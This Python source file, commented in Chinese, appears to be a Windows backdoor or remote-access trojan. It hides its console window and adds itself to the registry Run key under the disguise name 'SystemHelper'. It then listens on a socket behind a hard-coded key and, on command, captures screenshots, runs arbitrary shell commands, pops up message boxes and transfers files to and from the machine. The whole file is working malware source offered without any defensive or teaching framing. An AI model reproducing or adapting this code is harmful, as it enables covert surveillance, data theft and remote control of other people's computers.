
import os
import sys
import socket
import subprocess
import pyautogui
import winreg
import ctypes
import tkinter as tk
from tkinter import messagebox
from io import BytesIO
from threading import Thread
HOST = '127.0.0.1'
PORT = 34567
SECRET_KEY = '12345'  # 密钥
MAX_FILE_SIZE = 1024 * 1024 * 100  # 100MB限制
def add_to_startup():
    """添加开机自启动"""
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(reg_key)
    except Exception as e:
        print(f"注册表错误: {e}")
def hide_console():
    """隐藏控制台窗口"""
    if sys.platform.startswith('win'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
def take_screenshot():
    """截图并返回字节流"""
    img = pyautogui.screenshot()
    img_byte_arr = BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr.getvalue()
def execute_command(cmd):
    """执行系统命令"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
    except Exception as e:
        return str(e)
def show_message(title, content):
    """显示消息框"""
    def _show():
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(title, content)
        root.destroy()
    Thread(target=_show).start()
def handle_file_upload(file_path, conn):
    """处理文件上传"""
    try:
        file_size = int(conn.recv(1024).decode())
        if file_size > MAX_FILE_SIZE:
            return "文件大小超过限制"
        conn.send(b'READY')
        received = 0
        with open(file_path, 'wb') as f:
            while received < file_size:
                data = conn.recv(4096)
                if not data:
                    break
                f.write(data)
                received += len(data)
        return f"文件上传成功：{file_path}"
    except Exception as e:
        return f"上传失败：{str(e)}"
def handle_file_download(file_path, conn):
    """处理文件下载"""
    try:
        if not os.path.exists(file_path):
            return "文件不存在"
        file_size = os.path.getsize(file_path)
        conn.send(str(file_size).encode())
        ready = conn.recv(1024)
        if ready == b'READY':
            with open(file_path, 'rb') as f:
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    conn.sendall(data)
            return "文件发送完成"
        return "传输中断"
    except Exception as e:
        return f"下载失败：{str(e)}"
def main():
    hide_console()
    add_to_startup()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        while True:
            conn, addr = s.accept()
            try:
                data = conn.recv(1024).decode()
                if not data:
                    continue
                key, _, command = data.partition(':')
                if key != SECRET_KEY:
                    conn.send(b'Invalid secret key')
                    continue
                # 命令路由
                if command == 'screenshot':
                    screenshot_data = take_screenshot()
                    conn.sendall(screenshot_data)
                elif command.startswith('execute:'):
                    cmd = command.split(':', 1)[1]
                    result = execute_command(cmd)
                    conn.send(result.encode())
                elif command.startswith('messagebox:'):
                    _, title, content = command.split(':', 2)
                    show_message(title, content)
                    conn.send(b'Message displayed')
                elif command.startswith('upload:'):
                    file_path = command.split(':', 1)[1]
                    conn.send(b'START_UPLOAD')
                    result = handle_file_upload(file_path, conn)
                    conn.send(result.encode())
                elif command.startswith('download:'):
                    file_path = command.split(':', 1)[1]
                    result = handle_file_download(file_path, conn)
                    if "失败" in result or "不存在" in result:
                        conn.send(result.encode())
                else:
                    conn.send(b'Unknown command')
            except Exception as e:
                conn.send(f"Server Error: {e}".encode())
            finally:
                conn.close()
if __name__ == '__main__':
    main()

